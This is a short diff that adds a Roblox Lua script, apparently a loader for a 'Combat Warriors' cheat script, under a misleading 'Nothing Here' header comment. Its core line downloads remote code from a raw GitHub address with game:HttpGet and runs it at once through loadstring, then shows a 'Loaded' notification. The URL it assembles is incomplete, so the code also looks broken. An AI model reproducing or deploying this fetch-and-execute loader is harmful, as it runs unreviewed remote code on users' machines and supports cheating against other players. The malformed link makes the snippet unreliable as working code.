@@ -1,0 +1,11 @@
+--// Nothing Here \\--
+
+local _CW_ = "CombatWarriors"
+local _Link_ = "https://raw.githubusercontent.com/"
+loadstring(game:HttpGet(_Link_.._CW_, true))()
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "TUES CWPS Loaded";
+    Text = "The Combat Warriors Has Been Loaded.";
+    Duration = 15;
+})
